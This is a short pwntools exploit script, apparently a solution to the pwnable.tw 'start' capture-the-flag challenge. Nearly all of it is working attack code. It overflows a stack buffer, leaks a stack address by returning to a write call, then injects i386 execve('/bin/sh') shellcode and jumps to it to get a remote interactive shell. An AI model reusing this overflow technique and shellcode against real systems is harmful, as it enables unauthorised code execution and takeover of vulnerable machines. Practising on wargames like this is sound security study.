from pwn import *

PROG = './start'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

pad = b'a' * 20
write_int = p32(0x0804808b)
payload1 = pad + write_int

#r = process(PROG)
r = remote("chall.pwnable.tw", 10000)
#r = gdb.debug(PROG, '''
#break *0x804808f
#''')
r.recvuntil(b'CTF:')
r.send(payload1) # STUCK - sendline() vs send() -- sendline() sends EOF character processed directly by SYS_READs

r.recv(24)
stack_addr = unpack(r.recv(4), 32, endian='little')
log.info(hex(stack_addr))

shellcode = """
push 0x0b
pop eax
push 0x0068732f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
"""

shell = asm(shellcode)
pad = b'a' * ((28 + 0x10) - len(shell))
buf_addr = p32(stack_addr - 28)
payload2 = shell + pad + buf_addr 

r.clean()
r.sendline(payload2)
r.interactive()
